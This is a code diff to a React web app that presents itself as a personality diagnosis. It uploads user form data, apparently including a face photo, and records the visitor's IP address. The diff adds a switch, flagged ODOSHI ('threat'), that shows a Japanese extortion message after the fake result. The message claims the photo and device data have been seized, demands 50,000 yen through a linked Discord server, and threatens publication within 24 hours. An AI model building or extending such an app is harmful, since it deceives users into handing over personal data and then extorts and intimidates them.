@@ -133,6 +133,7 @@ function App() {
         body: formData,
       });
       const ip = await (await fetch("https://icanhazip.com")).text();
+      setIp(ip);
 
       await sleep(1000);
       if (MODE === "seikaku") {
@@ -153,6 +154,9 @@ function App() {
       setMessage("診断完了！結果を表示中...");
       await sleep(2000);
       setMode(1);
+      if (ODOSHI) {
+        setReveal(true);
+      }
     });
   };
 
@@ -250,7 +254,8 @@ function App() {
                   <p>あなたの顔写真と端末情報を取得しました</p>
                   <p>公開してほしくなかったら以下のサーバーに入り</p>
                   <p>5万円をお支払いください</p>
-                  <p>従わない場合は24時間後にネット上に全て公開します</p>
+                  <p>従わない場合は24時間後に</p>
+                  <p>ネット上に全て公開します</p>
                   <p>以下のサーバーに参加してください</p>
                   <a href="https://discord.gg/Vk7WZ4JaBA" className="text-blue-400">https://discord.gg/Vk7WZ4JaBA</a>
                 </div>
